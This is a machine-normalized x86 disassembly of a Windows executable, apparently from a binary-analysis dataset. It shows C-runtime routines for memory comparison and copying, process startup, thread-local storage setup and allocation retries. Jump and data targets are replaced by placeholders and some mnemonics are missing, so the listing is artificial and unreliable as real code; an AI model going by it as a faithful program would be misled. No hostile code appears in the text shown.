jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
sub_4048da
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_406b99
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_4031e0
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_402b50
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_406b99
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_406efa
add esp 0x14
mov eax esi
jmp r-xdata
sub_404979
cmp [ __dos_header ] 0x5a4d
jne r-xdata
xor eax eax
retn
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
cmp [ eax + r--data ] 0x10b
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
xor ecx ecx
cmp [ eax + __coff_header ] ecx
setne cl
mov eax ecx
retn
sub_4049ba
push 0x60
push r--data
call sub_405770
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x70 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
mov edi 0x94
push edi
push 0x0
mov ebx [ GetProcessHeap@IAT ]
call ebx
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov [ esi ] edi
push esi
call [ GetVersionExA@IAT ]
push esi
push 0x0
test eax eax
jne r-xdata
push 0x12
call sub_404955
mov eax [ esi + 0x10 ]
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov edi [ esi + 0xc ]
and edi 0x7fff
call ebx
push eax
call [ HeapFree@IAT ]
mov esi [ ebp - 0x20 ]
cmp esi 0x2
je r-xdata
call ebx
push eax
call [ HeapFree@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov eax ecx
shl eax 0x8
mov edx [ ebp - 0x28 ]
add eax edx
mov [ rw-data ] esi
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] edi
call sub_404979
mov [ ebp - 0x20 ] eax
xor ebx ebx
inc ebx
push ebx
call sub_407a55
pop ecx
test eax eax
jne r-xdata
or edi 0x8000
mov eax 0xff
call sub_40515a
test eax eax
jne r-xdata
push 0x1c
call sub_404955
call sub_4079b2
mov [ ebp - 0x4 ] ebx
call sub_40775e
test eax eax
jge r-xdata
push 0x10
call sub_404955
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_407629
mov [ rw-data ] eax
call sub_407570
test eax eax
jge r-xdata
push 0x1b
call sub_405454
pop ecx
call sub_4072fd
test eax eax
jge r-xdata
push 0x8
call sub_405454
pop ecx
push ebx
call sub_405570
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_405454
pop ecx
call sub_4072a0
test [ ebp - 0x44 ] bl
je r-xdata
push eax
call sub_405454
pop ecx
push 0xa
pop ecx
movzx ecx [ ebp - 0x40 ]
jmp r-xdata
call sub_405706
jmp r-xdata
push eax
call sub_4056e4
push ecx
push eax
push 0x0
push __dos_header
call sub_41d61b
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_4057b5
retn
sub_404b5b
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
call sub_405715
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_4056f5
call sub_4057b5
retn
sub_404ba4
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_404c2b
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_404c2b
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_404ba4
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_404d22
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
lea eax [ ebp - 0x4 ]
inc esi
xor ebx ebx
push eax
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
call sub_405534
cmp [ ebp - 0x4 ] 0x5
pop ecx
jle r-xdata
push edi
push ebx
call [ GetModuleHandleA@IAT ]
mov esi [ eax + 0x3c ]
add esi eax
cmp [ esi + 0x6 ] bx
movzx eax [ esi + 0x14 ]
lea edi [ eax + esi + 0x18 ]
jbe r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
push edi
push r--data
call sub_4059e0
test eax eax
pop ecx
pop ecx
je r-xdata
pop esi
pop ebx
leave
retn
and [ ebp - 0x8 ] 0x0
movzx eax [ esi + 0x6 ]
inc ebx
add edi 0x28
cmp ebx eax
jb r-xdata
jmp r-xdata
sub_404d8e
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
call sub_404d22
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
mov eax [ eax + 0x1f8 ]
jmp r-xdata
push [ esp + 0x8 ]
call eax
mov [ esp + 0x8 ] eax
test eax eax
je r-xdata
sub_404e05
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn
call sub_404d22
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
mov eax [ eax + 0x1fc ]
jmp r-xdata
push [ esp + 0x8 ]
call eax
mov [ esp + 0x8 ] eax
test eax eax
je r-xdata
sub_404e7c
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_404e05
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_404eae
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_404e05
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_405a68
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_404eeb
push 0xc
push r--data
call sub_405770
push r--data
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] rw-data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov eax rw-data
mov [ esi + 0x68 ] eax
push eax
call [ InterlockedIncrement@IAT ]
push 0xc
call sub_407d76
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
call sub_404d22
test eax eax
je r-xdata
push [ esi + 0x6c ]
call sub_406598
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_404fa1
call sub_4057b5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
push r--data
push [ ebp - 0x1c ]
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
sub_404faa
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_404e7c
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_40531e
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_404e05
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_405a68
pop ecx
xor esi esi
push 0x0
push esi
call sub_404eeb
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_405039
push 0x8
push r--data
call sub_405770
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4057b5
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_405a68
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_405a68
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_405a68
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_405a68
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_405a68
pop ecx
mov eax [ esi + 0x5c ]
cmp eax rw-data
je r-xdata
push eax
call sub_405a68
pop ecx
push 0xd
call sub_407d76
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_405a68
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405145
push 0xc
call sub_407d76
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405151
push esi
call sub_405a68
pop ecx
push edi
call sub_40661e
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_405a68
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_406458
pop ecx
sub_40515a
push edi
push r--data
call [ GetModuleHandleA@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_404eae
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_404e73
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_405724
push [ rw-data ]
call sub_404d8e
push [ rw-data ]
mov [ rw-data ] eax
call sub_404d8e
push [ rw-data ]
mov [ rw-data ] eax
call sub_404d8e
push [ rw-data ]
mov [ rw-data ] eax
call sub_404d8e
add esp 0x10
mov [ rw-data ] eax
call sub_407c00
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_404eae
push sub_405039
push [ rw-data ]
call sub_404e05
pop ecx
call eax
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
push 0x214
push 0x1
call sub_40531e
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_404e05
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_404eeb
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_4052de
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push [ esp + 0xc ]
call sub_405c3e
mov edi eax
test edi edi
pop ecx
jne r-xdata
sub_40531e
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_407da7
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_405366
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ esp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_407ec5
mov edi eax
test edi edi
pop ecx
pop ecx
jne r-xdata
sub_4053b1
push 0x10
push r--data
call sub_405770
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_406b99
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_406efa
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_407d76
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_408128
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_4057b5
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40544b
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_4054dd
push esi
mov esi [ esp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ esp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_4054fd
mov ecx [ esp + 0x4 ]
